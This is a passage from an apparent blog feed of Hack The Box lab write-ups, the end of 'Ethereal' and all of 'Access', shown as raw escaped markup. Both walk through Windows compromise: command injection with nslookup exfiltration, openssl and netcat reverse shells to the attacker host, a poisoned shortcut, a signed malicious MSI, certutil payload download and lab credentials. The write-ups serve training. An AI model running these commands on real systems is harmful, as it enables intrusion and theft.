responder responder -I tun0 then did this 10.10.xx.xx &amp;amp; nslookup test 10.10.xx.xx I finally got something : We can try to execute a system command and get the output by doing this : 10.10.xx.xx &amp;amp; for /f %i in ('whoami') do nslookup %i 10.10.xx.xx This is executing whoami then taking the output and doing nslookup with the output to our ip : We get etherealalan and that’s unusual as we expected ethereal\alan. We will start enumerating the filesystem this way , read this if you don’t understand some of the for commands that we will use. 10.10.xx.xx &amp;amp; for /f %i in ('cd') do nslookup %i 10.10.xx.xx So the current directory is c:\windows\system32\inetsrv We also need to know the users on the box : 10.10.xx.xx &amp;amp; for /f &quot;tokens=1,2,3&quot; %a in ('dir /B &quot;C:\Users&quot;') do nslookup %a.%b.%c 10.10.xx.xx We have 5 users on the box alan , jorge , Public , rupal and Administrator. We are executing commands as alan Next thing to look at is the installed programs : 10.10.xx.xx &amp;amp; for /f &quot;tokens=1,2,3&quot; %a in ('dir /B &quot;C:\Program Files (x86)&quot;') do nslookup %a.%b.%c 10.10.xx.xx We notice that OpenSSL is installed which is unusual , we also need to know why can’t we make the box connect back to us so we will check the firewall rules. In our case the easiest way to do this is to execute the command and only look for the string Rule Name: then redirect that output to a file , and read that file like we are doing. But first we need to find a place that we can write to. After some attempts I could write to c:\users\public\desktop\shortcuts , so we will do this : 10.10.xx.xx &amp;amp; netsh advfirewall firewall show rule name=all | findstr &quot;Rule Name:&quot; &amp;gt; C:\Users\Public\Desktop\Shortcuts\firewall.txt Then we will list the contents of c:\users\public\desktop\shortcuts 10.10.xx.xx &amp;amp; for /f &quot;tokens=1,2,3&quot; %a in ('dir /B &quot;C:\Users\Public\Desktop\Shortcuts&quot;') do nslookup %a.%b.%c 10.10.xx.xx And we see that we have successfully written into that directory , next step is to read the file : 10.10.xx.xx &amp;amp; for /f &quot;tokens=1,2,3,4,5,6,7&quot; %a in ('type C:\Users\Public\Desktop\Shortcuts\firewall.txt') do nslookup %a.%b.%c.%d.%e.%f.%g 10.10.xx.xx It’s only allowing TCP conections to port 73 and 136 , we saw earlier that openssl was installed on the box , we can create a SSL/TLS server on these ports and use openssl to make the box connect back to us. Generating certs and setting up the server First step is to generate certificates because we need them to set up the server openssl req -x509 -newkey rsa:4096 -keyout key.pem -out certificate.pem -days 365 -nodes Then we will split our terminal and run 2 servers , one on port 73 and the other on port 136 openssl s_server -key key.pen -cert certificate.pem -quiet -port [port] Read more about s_server We are setting up 2 servers because we are going to use openssl on the box to connect on port 73 and take our input , then we will pipe that input to cmd.exe then we will pipe the output to our server on port 136. Now we need to locate openssl.exe , if we listed the contents of OpenSSL-v1.1.0 in Program Files (x86) (can also be written Progra~2. check this) we will get this output : 10.10.xx.xx &amp;amp; for /f &quot;tokens=1,2,3&quot; %a in ('dir /B &quot;C:\Program Files (x86)\OpenSSL-v1.1.0&quot;') do nslookup %a.%b.%c 10.10.xx.xx We see a directory called bin that’s where openssl.exe is located so the path is c:\progra~2\OpenSSL-v1.1.0\bin\openssl.exe Now everything is ready , in the ping page we will write this : 10.10.xx.xx | &quot;C:\Program Files (x86)\OpenSSL-v1.1.0\bin\openssl.exe&quot; s_client -quiet -connect 10.10.xx.xx:73 | cmd.exe | &quot;C:\Program Files (x86)\OpenSSL-v1.1.0\bin\openssl.exe&quot; s_client -quiet -connect 10.10.xx.xx:136 Then we will check our server : Now we will write the commands on the first server (port 73) , then we will refresh the ping page , to send the post request again (this will pipe our input from port 73 to cmd.exe then to the server on port 136) then we will get our output on the second server. alan’s desktop doesn’t have the flag so we need to escalate to another user , there’s a note on alan’s desktop in a file called note-draft.txt: Creating a malicious lnk and getting User From the note we knew that there’s a lnk on Public’s desktop and other users on the box are using it. So if we replaced it with a payload we can get a shell as another user. There’s a tool on github called LNKup I used it to create the payload : To uplaod it we will close any one of the servers and run it again but this time we will redirect the lnk file to it : Then on the ping page we will type this : 10.10.xx.xx | &quot;C:\Program Files (x86)\OpenSSL-v1.1.0\bin\openssl.exe&quot; s_client -quiet -connect 10.10.xx.xx:136 &amp;gt; &quot;C:\Users\Public\Desktop\Shortcuts\rick.lnk&quot; We will close the server , run the 2 servers and get our shell as alan like we did before , then we will delete the original lnk and copy ours with the name of the old lnk : del &quot;c:\users\public\desktop\shortcuts\Visual Studio 2017.lnk&quot; &amp;amp; copy &quot;c:\users\public\desktop\shortcuts\rick.lnk&quot; &quot;c:\users\public\desktop\shortcuts\Visual Studio 2017.lnk&quot; &amp;amp; dir c:\users\public\desktop\shortcuts Then we will close the 2 servers , run them again and wait for someone to execute the lnk file , after a minute we will get a shell as jorge : With this we don’t need to refresh any pages because the connection is not handled by the ping page anymore so the command will be piped immediately from the first server to the second server. Finally we owned user ! More Filesystem Enumeration If we checked the other drives : fsutil fsinfo drives We will find that C is not the only drive and there’s also D. Unfortunately if someone started to enumerate without doing this important step in windows enumeration , they won’t get anything. Contents of D: In DEV there’s a directory called MSIs and it has a note : So we have to create a malicious msi and place it there to get a shell as rupal. We also need to get the certs to sign the msi , the certs are found in D:\Certs , MyCA.cer and MyCA.pvk , to transfer them to our box we will use openssl to base64 encode the certs then we can copy and decode on our box. C:\progra~2\OpenSSL-v1.1.0\bin\openssl.exe base64 -in MyCA.cer C:\progra~2\OpenSSL-v1.1.0\bin\openssl.exe base64 -in MyCA.pvk Now we will go to a windows box again to create the msi Creating Malicious msi and getting root In order to create the msi we will use wixtools , you can use other msi builders but they didn’t work for me. Check this page for some wix msi usage examples. We will create an msi that executes our lnk file : &amp;lt;?xml version=&quot;1.0&quot;?&amp;gt; &amp;lt;Wix xmlns=&quot;http://schemas.microsoft.com/wix/2006/wi&quot;&amp;gt; &amp;lt;Product Id=&quot;*&quot; UpgradeCode=&quot;12345678-1234-1234-1234-111111111111&quot; Name=&quot;Example Product Name&quot; Version=&quot;0.0.1&quot; Manufacturer=&quot;@_xpn_&quot; Language=&quot;1033&quot;&amp;gt; &amp;lt;Package InstallerVersion=&quot;200&quot; Compressed=&quot;yes&quot; Comments=&quot;Windows Installer Package&quot;/&amp;gt; &amp;lt;Media Id=&quot;1&quot; Cabinet=&quot;product.cab&quot; EmbedCab=&quot;yes&quot;/&amp;gt; &amp;lt;Directory Id=&quot;TARGETDIR&quot; Name=&quot;SourceDir&quot;&amp;gt; &amp;lt;Directory Id=&quot;ProgramFilesFolder&quot;&amp;gt; &amp;lt;Directory Id=&quot;INSTALLLOCATION&quot; Name=&quot;Example&quot;&amp;gt; &amp;lt;Component Id=&quot;ApplicationFiles&quot; Guid=&quot;12345678-1234-1234-1234-222222222222&quot;&amp;gt; &amp;lt;/Component&amp;gt; &amp;lt;/Directory&amp;gt; &amp;lt;/Directory&amp;gt; &amp;lt;/Directory&amp;gt; &amp;lt;Feature Id=&quot;DefaultFeature&quot; Level=&quot;1&quot;&amp;gt; &amp;lt;ComponentRef Id=&quot;ApplicationFiles&quot;/&amp;gt; &amp;lt;/Feature&amp;gt; &amp;lt;Property Id=&quot;cmdline&quot;&amp;gt;cmd.exe /C &quot;c:\users\public\desktop\shortcuts\rick.lnk&quot;&amp;lt;/Property&amp;gt; &amp;lt;CustomAction Id=&quot;Stage1&quot; Execute=&quot;deferred&quot; Directory=&quot;TARGETDIR&quot; ExeCommand='[cmdline]' Return=&quot;ignore&quot; Impersonate=&quot;yes&quot;/&amp;gt; &amp;lt;CustomAction Id=&quot;Stage2&quot; Execute=&quot;deferred&quot; Script=&quot;vbscript&quot; Return=&quot;check&quot;&amp;gt; fail_here &amp;lt;/CustomAction&amp;gt; &amp;lt;InstallExecuteSequence&amp;gt; &amp;lt;Custom Action=&quot;Stage1&quot; After=&quot;InstallInitialize&quot;&amp;gt;&amp;lt;/Custom&amp;gt; &amp;lt;Custom Action=&quot;Stage2&quot; Before=&quot;InstallFiles&quot;&amp;gt;&amp;lt;/Custom&amp;gt; &amp;lt;/InstallExecuteSequence&amp;gt; &amp;lt;/Product&amp;gt; &amp;lt;/Wix&amp;gt; We will use candle.exe from wixtools to create a wixobject from msi.xml Then we will use light.exe to create the msi file from the wixobject After that we need tools from microsoft sdk to sign our msi , first we will use makecert.exe to create new certs from the original certs we got from the box makecert.exe -n &quot;CN=Ethereal&quot; -pe -cy end -ic c:\tmp\MyCA.cer -iv c:\tmp\MyCA.pvk -sky signature -sv c:\tmp\rick.pvk c:\tmp\rick.cer It will ask for a password we will leave it blank for no password protection : Then we will use pvk2pfx.exe to create a pfx for both the cer and the pvk files. pvk2pfx.exe -pvk c:\tmp\rick.pvk -spc c:\tmp\rick.cer -pfx c:\tmp\rick.pfx And finally we will use signtool.exe to sign the msi with the pfx signtool.exe sign /f c:\tmp\rick.pfx c:\tmp\ethereal\rick.msi Now back to our kali we will upload the msi the same way we uploaded the lnk file before , and we also need to make sure that the lnk file is in c:\users\public\desktop\shortcuts\ because the msi is just executing that lnk. We will put the msi into D:\DEV\MSIs Then we will close the servers , run them again and wait for around 3-5 minutes until rupal opens the msi And we got root ! That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Hack The Box write-up : Hack The Box - Access Next Hack The Box write-up : Hack The Box - Carrier</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/ethereal/0.png" /></entry><entry><title type="html">Hack The Box - Access</title><link href="http://localhost:4000/hack-the-box/access/" rel="alternate" type="text/html" title="Hack The Box - Access" /><published>2019-03-02T00:00:00+02:00</published><updated>2019-03-02T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/access</id><content type="html" xml:base="http://localhost:4000/hack-the-box/access/">&lt;hr /&gt;

&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
&lt;h4 id=&quot;hey-guys-today-access-retired-and-this-is-my-write-up-i-dont-have-too-much-to-say-about-this-box--it-was-a-nice-easy-windows-box-and-a-good-example-of-using-runas-in-windows--which-is-like-sudo-in-linux-and-doas-in-openbsd-we-used-doas-in-ypuffy-its-a-windows-box-and-its-ip-is-10101098--i-added-it-to-etchosts-as-accesshtb&quot;&gt;Hey guys today Access retired and this is my write-up. I don’t have too much to say about this box , It was a nice easy windows box and a good example of using &lt;code class=&quot;highlighter-rouge&quot;&gt;runas&lt;/code&gt; in windows , Which is like &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo&lt;/code&gt; in linux and &lt;code class=&quot;highlighter-rouge&quot;&gt;doas&lt;/code&gt; in openbsd (we used &lt;code class=&quot;highlighter-rouge&quot;&gt;doas&lt;/code&gt; in &lt;a href=&quot;/hack-the-box/ypuffy&quot;&gt;Ypuffy&lt;/a&gt;). It’s a windows box and its ip is 10.10.10.98 , I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;access.htb&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/access/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-&quot;&gt;As always we will start with nmap to scan for open ports and services :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC access.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/access/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;nmap-tells-us-that-theres-ftp-running-on-port-21--telnet-on-port-23-and-http-on-port-80-it-also-tells-us-that-we-can-login-anonymously-to-ftp-lets-look-at-http-first&quot;&gt;Nmap tells us that there’s ftp running on port 21 , telnet on port 23 and http on port 80. It also tells us that we can login anonymously to ftp. Let’s look at http first.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;http-enumeration&quot;&gt;HTTP Enumeration&lt;/h3&gt;
&lt;h4 id=&quot;we-get-this-page-titled-as-megacorp-and-it-only-has-this-image-&quot;&gt;We get this page titled as “MegaCorp” and it only has this image :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/access/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;sub-directories-enumeration-with-gobuster-and-commontxt-usrsharewordlistsdirbcommontxt-in-kali-only-gave-us-2-pages--aspnet_client-and-indexhtml&quot;&gt;Sub directories enumeration with &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;common.txt&lt;/code&gt; (&lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/share/wordlists/dirb/common.txt&lt;/code&gt; in kali) only gave us 2 pages , &lt;code class=&quot;highlighter-rouge&quot;&gt;/aspnet_client&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;/index.html&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/access/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;aspnet_client-gave-us-403-forbidden-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/aspnet_client&lt;/code&gt; gave us &lt;code class=&quot;highlighter-rouge&quot;&gt;403&lt;/code&gt; Forbidden :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/access/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-indexhtml-is-of-course-the-main-page-we-saw-earlier-&quot;&gt;And &lt;code class=&quot;highlighter-rouge&quot;&gt;/index.html&lt;/code&gt; is of course the main page we saw earlier :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/access/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-now-we-know-that-http-has-nothing--next-thing-to-check-is-ftp&quot;&gt;So now we know that http has nothing , Next thing to check is ftp&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;ftp-enumeration&quot;&gt;FTP Enumeration&lt;/h3&gt;
&lt;h4 id=&quot;nmap-told-us-earlier-that-anonymous-login-on-ftp-was-allowed--after-we-login-we-find-2-directories-backups-and-engineer&quot;&gt;Nmap told us earlier that anonymous login on ftp was allowed , After we login we find 2 directories &lt;code class=&quot;highlighter-rouge&quot;&gt;Backups&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;Engineer&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/access/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;in-backups-there-is-only-one-file-called-backupmdb--we-will-type-binary-to-set-the-transfer-mode-to-binary--so-we-wont-get-a-corrupted-file-then-get-backupmdb-to-download-it-&quot;&gt;In &lt;code class=&quot;highlighter-rouge&quot;&gt;Backups&lt;/code&gt; there is only one file called &lt;code class=&quot;highlighter-rouge&quot;&gt;backup.mdb&lt;/code&gt; , we will type &lt;code class=&quot;highlighter-rouge&quot;&gt;binary&lt;/code&gt; to set the transfer mode to binary , so we won’t get a corrupted file. Then &lt;code class=&quot;highlighter-rouge&quot;&gt;get backup.mdb&lt;/code&gt; to download it :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/access/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-in-engineer-theres-a-file-called-access-controlzip-&quot;&gt;And in &lt;code class=&quot;highlighter-rouge&quot;&gt;Engineer&lt;/code&gt; there’s a file called &lt;code class=&quot;highlighter-rouge&quot;&gt;Access Control.zip&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/access/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;extracting-credentials-from-backupmdb-and-getting-user&quot;&gt;Extracting credentials from backup.mdb and getting User&lt;/h3&gt;
&lt;h4 id=&quot;backupmdb-is-a-microsoft-access-database--we-can-check-using-file-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;backup.mdb&lt;/code&gt; is a Microsoft Access Database , we can check using &lt;code class=&quot;highlighter-rouge&quot;&gt;file&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/access/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-need-mdbtools-to-deal-with-this-database--it-can-be-installed-with-apt&quot;&gt;We need mdbtools to deal with this database , it can be installed with &lt;code class=&quot;highlighter-rouge&quot;&gt;apt&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;apt-get install mdbtools&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-will-use-mdb-tables-to-get-the-table-names-&quot;&gt;We will use &lt;code class=&quot;highlighter-rouge&quot;&gt;mdb-tables&lt;/code&gt; to get the table names :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/access/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;theres-an-interesting-table-named-auth_user--we-will-use-mdb-export-to-get-the-contents-of-that-table-&quot;&gt;There’s an interesting table named &lt;code class=&quot;highlighter-rouge&quot;&gt;auth_user&lt;/code&gt; , We will use &lt;code class=&quot;highlighter-rouge&quot;&gt;mdb-export&lt;/code&gt; to get the contents of that table :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;mdb-export backup.mdb auth_user&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/access/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-it-gave-us-some-credentials-&quot;&gt;And it gave us some credentials :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;admin : admin&lt;/code&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;engineer : access4u@security&lt;/code&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;backup_admin : admin&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;by-looking-at-the-other-zip-file-we-will-find-a-file-called-access-controlpst-and-its-a-password-protected-file&quot;&gt;By looking at the other &lt;code class=&quot;highlighter-rouge&quot;&gt;zip&lt;/code&gt; file we will find a file called &lt;code class=&quot;highlighter-rouge&quot;&gt;Access Control.pst&lt;/code&gt; and it’s a password protected file.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/access/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-already-have-2-passwords--admin-and-access4usecurity-access4usecurity-is-the-right-password&quot;&gt;We already have 2 passwords : &lt;code class=&quot;highlighter-rouge&quot;&gt;admin&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;access4u@security&lt;/code&gt;. &lt;code class=&quot;highlighter-rouge&quot;&gt;access4u@security&lt;/code&gt; is the right password.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/access/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;access-controlpst-is-a-microsoft-outlook-email-folder-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Access Control.pst&lt;/code&gt; is a Microsoft Outlook email folder :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/access/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-can-use-a-tool-called-readpst-to-be-able-to-read-the-file-&quot;&gt;We can use a tool called &lt;code class=&quot;highlighter-rouge&quot;&gt;readpst&lt;/code&gt; to be able to read the file :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;readpst Access\ Control.pst&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/access/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-will-create-another-file-called-access-controlmbox--lets-cat-that-file-&quot;&gt;It will create another file called &lt;code class=&quot;highlighter-rouge&quot;&gt;Access Control.mbox&lt;/code&gt; , Let’s &lt;code class=&quot;highlighter-rouge&quot;&gt;cat&lt;/code&gt; that file :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/access/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;the-very-first-thing-we-see-is-this-email-which-has-credentials-for-an-account-called-security--password--4ccessc0ntr0ller&quot;&gt;The very first thing we see is this email which has credentials for an account called &lt;code class=&quot;highlighter-rouge&quot;&gt;security&lt;/code&gt; , password : &lt;code class=&quot;highlighter-rouge&quot;&gt;4CcessC0ntr0ller&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;lets-telnet-into-the-box-with-those-credentials-&quot;&gt;Let’s &lt;code class=&quot;highlighter-rouge&quot;&gt;telnet&lt;/code&gt; into the box with those credentials :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;telnet access.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/access/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-owned-user-&quot;&gt;And we owned user !&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;runas-and-privilege-escalation&quot;&gt;runas and Privilege Escalation&lt;/h3&gt;
&lt;h4 id=&quot;as-always-we-will-start-enumerating-the-filesystem--there-are-only-3-users-on-the-box-administrator--public-and-security&quot;&gt;As always we will start enumerating the filesystem , There are only 3 users on the box &lt;code class=&quot;highlighter-rouge&quot;&gt;Administrator&lt;/code&gt; , &lt;code class=&quot;highlighter-rouge&quot;&gt;Public&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;security&lt;/code&gt;.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/access/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-are-in-as-security-and-we-cant-go-into-administrators-directory-so-lets-check-public&quot;&gt;We are in as &lt;code class=&quot;highlighter-rouge&quot;&gt;security&lt;/code&gt; and we can’t go into Administrator’s directory so let’s check Public.&lt;/h4&gt;
&lt;h4 id=&quot;in-the-desktop-of-public-theres-a-lnk-called-zkaccess35-security-system&quot;&gt;In the Desktop of &lt;code class=&quot;highlighter-rouge&quot;&gt;Public&lt;/code&gt; there’s a &lt;code class=&quot;highlighter-rouge&quot;&gt;lnk&lt;/code&gt; called &lt;code class=&quot;highlighter-rouge&quot;&gt;ZKAccess3.5 Security System&lt;/code&gt;.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/access/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;lets-type-it-and-see-whats-inside-it-&quot;&gt;Let’s &lt;code class=&quot;highlighter-rouge&quot;&gt;type&lt;/code&gt; it and see what’s inside it :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/access/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;of-course-not-the-best-output--because-its-a-lnk-file-not-a-txt-file--but-we-can-read-some-stuff--and-we-notice-that-theres-a-runas-command-being-excuted-as-administrator-runas-allows-us-to-run-commands-as-another-user-and-the-option-savecred-allows-us-to-use-the-command-without-asking-for-password-looking-into-publics-desktop-is-not-necessary-to-know-that-we-can-check-by-executing-net-user-administrator&quot;&gt;Of course not the best output , because it’s a &lt;code class=&quot;highlighter-rouge&quot;&gt;lnk&lt;/code&gt; file not a &lt;code class=&quot;highlighter-rouge&quot;&gt;txt&lt;/code&gt; file , but we can read some stuff , and we notice that there’s a &lt;code class=&quot;highlighter-rouge&quot;&gt;runas&lt;/code&gt; command being excuted as administrator. &lt;code class=&quot;highlighter-rouge&quot;&gt;runas&lt;/code&gt; allows us to run commands as another user and the option &lt;code class=&quot;highlighter-rouge&quot;&gt;/savecred&lt;/code&gt; allows us to use the command without asking for password. Looking into Public’s desktop is not necessary to know that, we can check by executing &lt;code class=&quot;highlighter-rouge&quot;&gt;net user administrator&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/access/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;password-required-is-set-to-no--if-this-was-set-to-yes-we-wouldnt-be-able-to-use-runas-as-administrator-without-knowing-the-password--however-that-lnk-file-on-publics-desktop-was-a-nice-hint&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Password required&lt;/code&gt; is set to &lt;code class=&quot;highlighter-rouge&quot;&gt;No&lt;/code&gt; , If this was set to &lt;code class=&quot;highlighter-rouge&quot;&gt;Yes&lt;/code&gt; we wouldn’t be able to use &lt;code class=&quot;highlighter-rouge&quot;&gt;runas&lt;/code&gt; as administrator without knowing the password , However that &lt;code class=&quot;highlighter-rouge&quot;&gt;lnk&lt;/code&gt; file on Public’s desktop was a nice hint.&lt;/h4&gt;
&lt;h4 id=&quot;now-we-can-run-a-simple-http-server-on-our-box-with-python-and-host-ncexe--python--m-simplehttpserver-80-80-is-the-port-number-and-it-can-be-anything&quot;&gt;Now we can run a simple HTTP server on our box with python and host &lt;code class=&quot;highlighter-rouge&quot;&gt;nc.exe&lt;/code&gt; : &lt;code class=&quot;highlighter-rouge&quot;&gt;python -m SimpleHTTPServer 80&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;80&lt;/code&gt; is the port number and it can be anything&lt;/h4&gt;
&lt;h4 id=&quot;you-can-get-ncexe-from-github-here--i-also-remember-that-i-included-another-link-in-secnotes-write-up&quot;&gt;You can get &lt;code class=&quot;highlighter-rouge&quot;&gt;nc.exe&lt;/code&gt; from github &lt;a href=&quot;https://github.com/diegocr/netcat/blob/master/nc.exe&quot;&gt;here&lt;/a&gt; , I also remember that I included another link in &lt;a href=&quot;/hack-the-box/secnotes&quot;&gt;SecNotes write-up&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;then-we-will-download-it-on-the-box-&quot;&gt;Then we will download it on the box :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;certutil -urlcache -split -f http://10.10.xx.xx/nc.exe nc.exe&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/access/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;after-that-we-will-set-up-our-nc-listener-nc--lvnp-1337-1337-is-the-port-number-and-it-can-be-anything&quot;&gt;After that we will set up our nc listener &lt;code class=&quot;highlighter-rouge&quot;&gt;nc -lvnp 1337&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;1337&lt;/code&gt; is the port number and it can be anything.&lt;/h4&gt;
&lt;h4 id=&quot;finally-we-will-use-runas-to-get-a-reverse-shell-&quot;&gt;Finally we will use &lt;code class=&quot;highlighter-rouge&quot;&gt;runas&lt;/code&gt; to get a reverse shell :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;runas /user:Administrator /savecred &quot;nc.exe -c cmd.exe 10.10.xx.xx 1337&quot;&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/access/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;lets-check-our-listener-&quot;&gt;Let’s check our listener :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/access/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-have-a-shell&quot;&gt;We have a shell.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/access/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-owned-root-&quot;&gt;And we owned root !&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---zipper&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/zipper/&quot;&gt;Hack The Box - Zipper&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---ethereal&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/ethereal/&quot;&gt;Hack The Box - Ethereal&lt;/a&gt;&lt;/h4&gt;
